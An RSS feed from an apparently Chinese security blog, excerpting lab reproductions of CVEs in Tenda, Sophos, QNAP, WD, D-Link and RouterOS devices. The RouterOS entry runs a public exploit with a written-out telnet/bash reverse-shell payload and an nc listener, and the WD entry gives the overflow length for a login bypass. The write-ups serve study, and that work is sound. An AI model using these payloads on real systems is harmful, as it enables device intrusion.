<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>cocoon </title>
    <link>http://jellyfish-pro.github.io/</link>
    <description>Recent content on cocoon </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language><atom:link href="http://jellyfish-pro.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title></title>
      <link>http://jellyfish-pro.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://jellyfish-pro.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞
环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）
这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）
环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi
随后使用binwalk提取固件
binwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：
通过检查一下busybox，目的是检查该固件需要的位数和架构：
arm架构，32位，小端。
所以我们需要使用qemu-arm-static来拟真环境
sudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./
执行命令后，我们看到程序在 Welcome to ...处不动了。
为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：
通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。
这里我们可以通过两个方法解决这个问题：
给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：
sudo apt install uml-utilities bridge-utilssudo brctl addbr br0sudo brctl addif br0 ens33sudo ifconfig br0 upsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功
随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：</description>
    </item>
    
    <item>
      <title></title>
      <link>http://jellyfish-pro.github.io/vuln/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://jellyfish-pro.github.io/vuln/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
      <description>漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。
该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。
环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。
随后使用VMware打开.ova文件就可以直接搭建好sophos环境。
不过这里需要注意一点就是网卡的配置：
sophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：
像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。
这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0
接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。
第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。
配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：
json数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。
sophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：
通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。
Apache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。
sophos中的perl是指向csc的：
而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。
这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。
漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。
我们可以使用一个简单例子：
对于处理同样的数据：
{ &amp;quot;name\u0000ef&amp;quot;: &amp;quot;test&amp;quot;, &amp;quot;name&amp;quot;:&amp;quot;test2&amp;quot; }
对于java来说：
import org.json.JSONObject;import org.json.JSONException;import java.io.*;class test {public static void main(String[] args) {try{System.out.println(new JSONObject(&amp;#34;{ \&amp;#34;name\&amp;#34;: \&amp;#34;test\&amp;#34;, \&amp;#34;name\\u0000ef\&amp;#34;: \&amp;#34;test2\&amp;#34;}&amp;#34;));}catch (JSONException e){System.</description>
    </item>
    
    <item>
      <title></title>
      <link>http://jellyfish-pro.github.io/vuln/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://jellyfish-pro.github.io/vuln/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。
固件版本为：
该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。
环境搭建 这里是直接使用的设备(qnap TS-853 pro)
该设备可以直接通过ssh和telnet连接上shell：
连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell
漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。
针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：
[CVE-2022-27596 | CataLpa&amp;rsquo;s Home (wzt.ac.cn)]
该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。
静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中
该函数删除了符号，但可以通过搜索字符串找到。
v9 = s···if ( *(_QWORD *)(a8 + 24) ){v13 = *(const char **)(a8 + 24);v14 = strlen(s);a2 = &amp;#34;AND token = &amp;#39;%s&amp;#39; &amp;#34;;sprintf(&amp;amp;s[v14], &amp;#34;AND token = &amp;#39;%s&amp;#39; &amp;#34;, v13);}···v49 = sqlite3_mprintf(&amp;amp;byte_7FFFF76DFA7F, a2, v9);···v48 = sqlite3_mprintf(&amp;#34;SELECT * FROM QTOKEN %s %s %s;&amp;#34;, v49, v51, v50);···sqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到&amp;quot;AND token = &#39;%s&#39; &amp;quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制</description>
    </item>
    
    <item>
      <title></title>
      <link>http://jellyfish-pro.github.io/vuln/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://jellyfish-pro.github.io/vuln/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。
环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。
因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。
当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录
执行下面的命令将pure-ftpd修改为西数的版本：
tar xf pure-ftpd_1.0.47.orig.tar.gzcd pure-ftpd-1.0.47.origfor patch_name in `ls ../patch`; do echo &amp;#34;--&amp;gt;patch name=$patch_name&amp;#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。
解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。
根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。
但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：
这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。
bin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。
刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：
这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录
而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：
可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。
将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init
**注意：**这里的路径是已经被挂载后的路径。
这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。
启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。
虽然环境不能启动，但是我们可以直接启动ftp服务呀。
我们可以直接启动ftp服务：
漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。
而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：
这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。
那么为什么要覆盖着loggedin呢？
其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：
动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：
但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。
故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent
其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。</description>
    </item>
    
    <item>
      <title></title>
      <link>http://jellyfish-pro.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://jellyfish-pro.github.io/vuln/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 + qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。</description>
    </item>
    
    <item>
      <title></title>
      <link>http://jellyfish-pro.github.io/vuln/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://jellyfish-pro.github.io/vuln/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。
漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。
首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像
这里我选择的是 RouterOS 6.38.4
然后使用VMware模拟，这里我们指出几个需要注意的点：
这里可以选择Linux 3.x 内核。
随后创建完成虚拟机后，需要修改虚拟机配置：
这里需要将 硬盘(SCSI)改为IDE
随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入&#39;a&#39;选择所有，然后输入&#39;i&#39;进行安装，然后根据提示一直按 &#39;y&#39;就可以：
安装好后使用 admin：&#39;&#39;登录RouterOS。
然后输入setup命令，根据提示设置ip地址
最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。
RouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。
这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。
使用方法也很简单：
#git clone https://github.com/0ki/mikrotik-tools.git#cd mikrotik-tools#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。
**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。
出现截图中的语句则表示越狱成功。
接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:&#39;&#39;)
RouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.
**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)
首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：
#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：
#nc -lnvp 8080 然后使用exp，执行命令：
#./StackClash_x86.py 192.168.113.129 80 www_binary &amp;#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &amp;lt; /ram/f | /bin/bash &amp;gt;/ram/f 2&amp;gt;&amp;amp;1&amp;#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。</description>
    </item>
    
  </channel>
</rss>
